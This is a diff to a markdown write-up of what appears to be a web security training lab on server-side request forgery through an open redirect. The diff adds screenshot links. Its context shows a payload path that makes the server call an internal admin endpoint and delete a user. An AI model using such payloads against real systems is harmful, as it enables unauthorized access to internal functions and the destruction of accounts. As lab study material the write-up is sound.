@@ -13,3 +13,8 @@ This lab has a stock check feature which fetches data from an internal system. T
     Amend the path to delete the target user:
 
     /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+![Screenshot_2023-05-20_15_42_18](https://github.com/a-fai1ur3/Writeups/assets/119417999/441fb6ba-2a19-4c03-86a8-68bd4ec7b951)
+![Screenshot_2023-05-20_15_43_24](https://github.com/a-fai1ur3/Writeups/assets/119417999/50fd9c64-a426-4aba-8b5b-b68775ba713c)
+![Screenshot_2023-05-20_15_43_57](https://github.com/a-fai1ur3/Writeups/assets/119417999/9a71c32e-d82d-4104-8351-e85812edc8c9)
+
